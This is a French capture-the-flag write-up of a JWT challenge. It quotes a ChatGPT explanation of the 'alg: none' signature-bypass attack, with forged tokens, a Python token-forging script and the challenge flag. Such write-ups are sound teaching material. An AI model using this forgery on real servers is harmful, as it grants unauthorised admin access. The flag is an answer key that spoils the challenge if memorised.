![amulette_akawa_3](../../../../attachements/amulette_akawa_3.png)

## Enoncé

>Tu avances plus profondément dans la grotte, là où réside la Chouette Nocturne, symbole de sagesse et d'illusion. Elle pose une énigme encore plus complexe :* "L'apparence peut être trompeuse. Ce que tu crois être solide peut ne pas l'être."*
>
>Devant toi se dresse une tablette de pierre sur laquelle est inscrite une nouvelle formule magique sous forme de symbole chiffré. Cette fois, tu sens que la protection semble plus solide, mais la chouette murmure : "Ce que l'on te dit être indestructible peut être réduit à néant si tu sais où chercher."
>
>Tu réalises qu'il te suffit de modifier subtilement l'algorithme de la formule pour la rendre inoffensive, ouvrant ainsi un passage vers la suite.

## Résolution

Idem que pour [L'Amulette d'Akawa 2 - La Bénédiction de l'Anguille d'Or](L'Amulette%20d'Akawa%202%20-%20La%20Bénédiction%20de%20l'Anguille%20d'Or.md) sauf que cette fois ci on refait un jwt on lui indiquant qu’il n’y a pas d’algorithme à vérifier.

D’après chatgpt : 

Pour exploiter un JWT en utilisant l'algorithme **"none"**, tu dois comprendre comment le JWT est vérifié côté serveur. Si le serveur n'est pas correctement configuré, il pourrait accepter un jeton avec une signature vide et ignorer la vérification. Voici comment cette attaque fonctionne et les étapes pour tenter de l'exploiter.

### Contexte : JWT avec algorithme "none"

Un JWT a trois parties :
1. **Header** : contient l'algorithme de signature, par exemple `"alg": "HS256"`.
2. **Payload** : contient les données.
3. **Signature** : protège contre la modification des deux premières parties.

Si le serveur accepte un JWT où l'algorithme est `"none"`, cela signifie que le serveur ne vérifie **pas** la signature, ce qui rend possible la modification du jeton sans recalculer la signature.

### Étapes pour exploiter en changeant l'algorithme à "none"

#### 1. Décoder le JWT actuel

Décode d'abord le **header** et le **payload** de ton JWT en **base64**.

Ton JWT actuel :
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6MCwiZXhwIjoxNzI4MzM2ODczfQ.FgJBalNV4fO0a78hjh1iJqBznKjAtmQ8O1Ob3eXuls8
```

Décodage du **header** :
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

Décodage du **payload** :
```json
{
  "admin": 0,
  "exp": 1728336873
}
```

#### 2. Modifier le header pour utiliser l'algorithme "none"

Remplace l'algorithme `"HS256"` par `"none"` dans le **header** :

```json
{
  "alg": "none",
  "typ": "JWT"
}
```

#### 3. Modifier le payload

Modifie le **payload** pour donner à l'utilisateur des droits administratifs en changeant `"admin": 0` à `"admin": 1` :

```json
{
  "admin": 1,
  "exp": 1728336873
}
```

#### 4. Recombiner le JWT sans signature

- **Header encodé en base64** : `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0`
- **Payload encodé en base64** : `eyJhZG1pbiI6MSwiZXhwIjoxNzI4MzM2ODczfQ`

Tu recombines ces deux parties pour former un JWT **sans signature** :

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJhZG1pbiI6MSwiZXhwIjoxNzI4MzM2ODczfQ.
```

Note que la troisième partie (la signature) est vide après le dernier point.

#### 5. Envoyer le nouveau JWT

Remplace l'ancien JWT dans la requête par le nouveau jeton avec l'algorithme `"none"`. Si le serveur est mal configuré et accepte ce JWT, il pourrait te donner un accès administrateur sans vérifier la signature.

### Pourquoi cette attaque fonctionne

Lorsque tu changes l'algorithme à `"none"`, tu indiques au serveur qu'aucune signature n'est nécessaire pour ce JWT. Si le serveur n'a pas été correctement configuré pour rejeter ce type de jeton, il peut accepter le JWT sans signature et traiter les données du **payload** telles qu'elles sont, y compris le fait que `admin = 1`.

### Problèmes potentiels

- Si le serveur est correctement configuré, il rejettera un jeton avec `"alg": "none"`.
- Certains serveurs peuvent avoir des protections contre cette attaque, notamment en vérifiant que tous les jetons doivent avoir une signature valide.

### Outils pour tester

Tu peux utiliser des outils comme [jwt.io](https://jwt.io) pour facilement décoder, modifier et tester des jetons JWT.

Si tu veux tester l'exploitation de JWT avec Python, tu peux utiliser des bibliothèques comme **PyJWT** pour construire un tel JWT.

### Exemple Python pour créer un JWT avec "none"

```python
import base64
import json

header = {
    "alg": "none",
    "typ": "JWT"
}
payload = {
    "admin": 1,
    "exp": 1728336873
}

# Encodage en base64 sans padding
def base64_encode(data):
    return base64.urlsafe_b64encode(json.dumps(data).encode()).decode().rstrip('=')

header_encoded = base64_encode(header)
payload_encoded = base64_encode(payload)

# Le JWT avec "none" comme algorithme n'a pas de signature
jwt = f"{header_encoded}.{payload_encoded}."

print(jwt)
```

Cela te donnera un JWT avec `"alg": "none"` que tu peux tester si le serveur est vulnérable.


On envoi dans le jwt suivant au serveur : `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJhZG1pbiI6MSwiZXhwIjoxNzI4MzM2ODczfQ.
` et ça passe.

>[!question]- Spoiler du flag
> OPENNC{JW7_N3eDs_41g0_Ch3cK1nG_70_b3_s4f3}

